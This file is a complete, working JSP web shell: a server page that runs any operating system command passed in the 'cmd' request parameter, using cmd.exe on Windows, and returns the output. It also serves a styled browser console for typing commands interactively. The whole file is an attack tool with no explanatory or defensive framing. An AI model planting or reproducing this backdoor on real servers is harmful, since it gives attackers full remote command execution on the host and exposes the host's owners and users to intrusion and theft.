<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");

if(cmd != null) {

    StringBuffer output = new StringBuffer();
    response.setContentType( "text/plain" );

    String s = null;
    try {
        boolean windows = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
        if ( windows ) {
            cmd = "cmd.exe /C " + cmd;
        }
        Process p = Runtime.getRuntime().exec( cmd );
        BufferedReader sI = new BufferedReader( new InputStreamReader( p.getInputStream() ) );
        while( ( s = sI.readLine() ) != null ) {
            output.append( s );
            output.append( "\n" );
        }
        out.print( output.toString() );
    } catch( IOException e ) {
        e.printStackTrace();

    }
} else {
    response.setContentType( "text/html" );
%>
<html>
<head>
	<style type="text/css"><!--
		body {
			font-family: tahoma, arial, sans-serif;
			font-size: 75%; /* 12px */
			padding: 10px 20px;
			background-color: black;
			color: lightgreen;
		}

		* {
			font-size: 1em; /* 12px */
		}
		a {
			color: lightgreen;
			text-decoration: underline;
		}

		pre {
			border: 2px solid lightgreen;
			font-family: courier new, fixed;
			width: 100%;
			height: 70%;
			padding: 5px;
			overflow: auto;
		}
		input, select {
			border: 1px solid lightgreen;
			background-color: black;
			color: lightgreen;
			padding: 5px;
			font-family: courier new, fixed;
			margin: 5px;
		}
		input[type="text"], select {
			width: 50%;
		}
		h2 {
			font-size: 1.25em;
		}
	--></style>
</head>
<body onload="document.forms[0].c.focus();">
	<script>
		function s(f) {
			p = f.p.value;
			c = f.c.value;

			document.getElementById("o").innerHTML += "> <a href='#' onclick='return sh(this);'>" + c + "</a>\n";

			var x = new XMLHttpRequest();
			x.addEventListener("load", function() {
				o = document.getElementById("o");
				o.innerHTML += this.responseText;
				o.scrollTop = o.scrollHeight;
			});
			x.open("GET", p + "?cmd=" + c);
			x.send();

			f.c.value = "";
		}
		function sh(a) {
			document.forms[0].c.value = a.innerText;
			document.forms[0].c.focus();
			return false;
		}
	</script>
	<form onsubmit="s(this);return false;">
		<input type="text" name="p" value="<%= request.getServletPath() %>" /> Shell Path
		<br />
		<input type="text" name="c" value="" autocomplete="off" /> Command
		<br />
		<input type="submit" value="Execute" />
		<br />
		<h2>Output</h2>
<pre id="o">
</pre>
	</form>
</body>
</html>
<%
}

%>
